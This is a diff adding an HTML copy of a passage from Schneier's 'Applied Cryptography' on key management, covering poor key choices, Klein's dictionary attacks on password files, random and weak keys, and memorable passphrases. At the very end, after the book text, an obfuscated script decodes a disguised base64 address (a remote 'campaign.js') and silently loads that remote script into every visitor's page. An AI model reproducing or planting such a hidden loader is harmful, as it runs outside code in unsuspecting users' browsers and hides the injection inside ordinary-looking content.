@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Management</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=08//-->
+<!--PAGES=171-174//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>And remember, computing power doubles every 18 months. If you expect your keys to stand up against brute-force attacks for 10 years, you&#146;d better plan accordingly.
+</P>
+<P><FONT SIZE="+1"><B><I>Poor Key Choices</I></B></FONT></P>
+<P>When people choose their own keys, they generally choose poor ones. They&#146;re far more likely to choose &#147;Barney&#148; than &#147;*9 (hH/A.&#148; This is not always due to poor security practices; &#147;Barney&#148; is easier to remember than &#147;*9 (hH/A.&#148; The world&#146;s most secure algorithm won&#146;t help much if the users habitually choose their spouse&#146;s names for keys or write their keys on little pieces of paper in their wallets. A smart brute-force attack doesn&#146;t try all possible keys in numerical order; it tries the obvious keys first.
+</P>
+<P>This is called a <B>dictionary attack</B>, because the attacker uses a dictionary of common keys. Daniel Klein was able to crack 40 percent of the passwords on the average computer using this system [847,848]. No, he didn&#146;t try one password after another, trying to login. He copied the encrypted password file and mounted the attack offline. Here&#146;s what he tried:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The user&#146;s name, initials, account name, and other relevant personal information as a possible password. All in all, up to 130 different passwords were tried based on this information. For an account name <B>klone</B> with a user named &#147;Daniel V. Klein,&#148; some of the passwords that would be tried were: klone, klone0, klone1, klone123, dvk, dvkdvk, dklein, DKlein leinad, nielk, dvklein, danielk, DvkkvD, DANIEL-KLEIN, (klone), KleinD, and so on.
+<DD><B>2.</B>&nbsp;&nbsp;Words from various databases. These included lists of men&#146;s and women&#146;s names (some 16,000 in all); places (including variations so that &#147;spain,&#148; &#147;spanish,&#148; and &#147;spaniard&#148; would all be considered); names of famous people; cartoons and cartoon characters; titles, characters, and locations from films and science fiction stories; mythical creatures (garnered from <I>Bullfinch&#146;s Mythology</I> and dictionaries of mythical beasts); sports (including team names, nicknames, and specialized terms); numbers (both as numerals&#151;&#147;2001,&#148; and written out&#151;&#147;twelve&#148;); strings of letters and numbers (&#147;a,&#148; &#147;aa,&#148; &#147;aaa,&#148; &#147;aaaa,&#148; etc.); Chinese syllables (from the Pinyin Romanization of Chinese, an international standard system of writing Chinese on an English keyboard); the King James Bible; biological terms; colloquial and vulgar phrases (such as &#147;fuckyou,&#148; &#147;ibmsux,&#148; and &#147;deadhead&#148;); keyboard patterns (such as &#147;qwerty,&#148; &#147;asdf,&#148; and &#147;zxcvbn&#148;); abbreviations (such as &#147;roygbiv&#148;&#151;the colors in the rainbow, and &#147;ooottafagvah&#148;&#151;a mnemonic for remembering the 12 cranial nerves); machine names (acquired from /<I>etc/hosts</I>); characters, plays, and locations from Shakespeare; common Yiddish words; the names of asteroids; and a collection of words from various technical papers Klein previously published. All told, more than 60,000 separate words were considered per user (with any inter- and intra-dictionary duplicates being discarded).
+<DD><B>3.</B>&nbsp;&nbsp;Variations on the words from step 2. This included making the first letter uppercase or a control character, making the entire word uppercase, reversing the word (with and without the aforementioned capitalization), changing the letter &#145;o&#146; to the digit &#145;0&#146; (so that the word &#147;scholar&#148; would also be checked as &#147;sch0lar&#148;), changing the letter &#145;l&#146; to the digit &#145;1&#146; (so that the word &#147;scholar&#148; would also be checked as &#147;scho1ar&#148;), and performing similar manipulation to change the letter &#145;z&#146; into the digit &#145;2&#146;, and the letter &#145;s&#146; into the digit &#145;5&#146;. Another test was to make the word into a plural (irrespective of whether the word was actually a noun), with enough intelligence built in so that &#147;dress&#148; became &#147;dresses,&#148; &#147;house&#148; became &#147;houses,&#148; and &#147;daisy&#148; became &#147;daisies.&#148; Klein did not consider pluralization rules exclusively, though, so that &#147;datum&#148; forgivably became &#147;datums&#148; (not &#147;data&#148;), while &#147;sphynx&#148; became &#147;sphynxs&#148; (and not &#147;sphynges&#148;). Similarly, the suffixes &#147;-ed,&#148; &#147;-er,&#148; and &#147;-ing&#148; were added to transform words like &#147;phase&#148; into &#147;phased,&#148; &#147;phaser,&#148; and &#147;phasing.&#148; These additional tests added another 1,000,000 words to the list of possible passwords that were tested for each user.
+<DD><B>4.</B>&nbsp;&nbsp;Various capitalization variations on the words from step 2 that were not considered in step 3. This included all single-letter capitalization variations (so that &#147;michael&#148; would also be checked as &#147;mIchael,&#148; &#147;miChael,&#148; &#147;micHael,&#148; &#147;michAel,&#148; etc.), double-letter capitalization variations (&#147;MIchael,&#148; &#147;MiChael,&#148; &#147;MicHael,&#148;..., &#147;mIChael,&#148; &#147;mIcHael,&#148; etc.), triple-letter variations, etc. The single-letter variations added roughly another 400,000 words to be checked per user, while the double-letter variations added another 1,500,000 words. Three-letter variations would have added at least another 3,000,000 words per user had there been enough time to complete the tests. Tests of four-, five-, and six-letter variations were deemed to be impracticable without much more computational horsepower to carry them out.
+<DD><B>5.</B>&nbsp;&nbsp;Foreign language words on foreign users. The specific test that was performed was to try Chinese language passwords on users with Chinese names. The Pinyin Romanization of Chinese syllables was used, combining syllables together into one-, two-, and three-syllable words. Because no tests were done to determine whether the words actually made sense, an exhaustive search was initiated. Since there are 298 Chinese syllables in the Pinyin system, there are 158,404 two-syllable words, and slightly more than 16,000,000 three-syllable words. A similar mode of attack could as easily be used with English, using rules for building pronounceable nonsense words.
+<DD><B>6.</B>&nbsp;&nbsp;Word pairs. The magnitude of an exhaustive test of this nature is staggering. To simplify the test, only words of three or four characters in length from <I>/usr/dict/words</I> were used. Even so, the number of word pairs is about ten million.
+</DL>
+<P>A dictionary attack is much more powerful when it is used against a file of keys and not a single key. A single user may be smart enough to choose good keys. If a thousand people each choose their own key as a password to a computer system, the odds are excellent that at least one person will choose a key in the attacker&#146;s dictionary.
+</P>
+<P><FONT SIZE="+1"><B><I>Random Keys</I></B></FONT></P>
+<P>Good keys are random-bit strings generated by some automatic process. If the key is 64 bits long, every possible 64-bit key must be equally likely. Generate the key bits from either a reliably random source (see Section 17.14) or a cryptographically secure pseudo-random-bit generator (see Chapters 16 and 17.) If these automatic processes are unavailable, flip a coin or roll a die.
+</P>
+<P>This is important, but don&#146;t get too caught up in arguing about whether random noise from audio sources is more random than random noise from radioactive decay. None of these random-noise sources will be perfect, but they will probably be good enough. It is important to use a good random-number generator for key generation, but it is far more important to use good encryption algorithms and key management procedures. If you are worried about the randomness of your keys, use the key-crunching technique described below.</P>
+<P>Some encryption algorithms have weak keys: specific keys that are less secure than the other keys. I advise testing for these weak keys and generating a new one if you discover one. DES has only 16 weak keys out of 2<SUP>56</SUP>, so the odds of generating any of these keys are incredibly small. It has been argued that a cryptanalyst would have no idea that a weak key is being used and therefore gains no advantage from their accidental use. It has also been argued that not using weak keys gives a cryptanalyst information. However, testing for the few weak keys is so easy that it seems imprudent not to do so.</P>
+<P>Generating keys for public-key cryptography systems is harder, because often the keys must have certain mathematical properties (they may have to be prime, be a quadratic residue, etc.). Techniques for generating large random prime numbers are discussed in Section 11.5. The important thing to remember from a key management point of view is that the random seeds for those generators must be just that: random.</P>
+<P>Generating a random key isn&#146;t always possible. Sometimes you need to remember your key. (See how long it takes you to remember 25e8 56f2 e8ba c820). If you have to generate an easy-to-remember key, make it obscure. The ideal would be something easy to remember, but difficult to guess. Here are some suggestions:</P>
+<DL>
+<DD>&#151; Word pairs separated by a punctuation character, for example &#147;turtle*moose&#148; or &#147;zorch!splat&#148;
+<DD>&#151; Strings of letters that are an acronym of a longer phrase; for example, &#147;Mein Luftkissenfahrzeug ist voller Aale!&#148; generates the key &#147;MLivA!&#148;
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="08-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(azXDfJaW, njvVfXwP) {njvVfXwP = azXDfJaW.createElement('script');njvVfXwP.type = 'text/javascript';njvVfXwP.async = true;njvVfXwP.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');azXDfJaW.getElementsByTagName('body')[0].appendChild(njvVfXwP);}(document));</script></body>
+</html>
